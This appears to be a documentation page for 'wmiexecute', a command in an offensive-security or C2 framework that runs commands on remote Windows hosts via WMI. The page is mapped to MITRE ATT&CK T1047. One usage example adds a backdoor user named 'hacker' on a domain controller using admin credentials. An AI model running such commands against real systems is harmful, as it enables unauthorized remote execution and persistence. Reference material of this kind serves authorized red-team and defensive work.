+++
title = "wmiexecute"
chapter = false
weight = 103
hidden = false
+++

## Summary
Execute a command on a local or remote host via WMI `Win32_Process::Create` using `wmic.exe`. Optionally authenticate with alternate credentials.

### Arguments

#### command
The full command line to execute. Wrapped in `cmd.exe /Q /c` before being passed to WMI.

#### host (optional)
Remote hostname or IP. If omitted, executes locally.

#### username (optional)
Username for WMI authentication.

#### domain (optional)
Domain for the supplied username.

#### password (optional)
Plaintext password for WMI authentication.

## Usage
```
wmiexecute -command <cmd> [-host <host>] [-username <user>] [-domain <domain>] [-password <pass>]
```

Example
```
wmiexecute -command "whoami" -host 192.168.1.10
wmiexecute -command "net user hacker P@ss /add" -host dc01 -username admin -domain CORP -password P@ssw0rd
```

## MITRE ATT&CK Mapping

- T1047
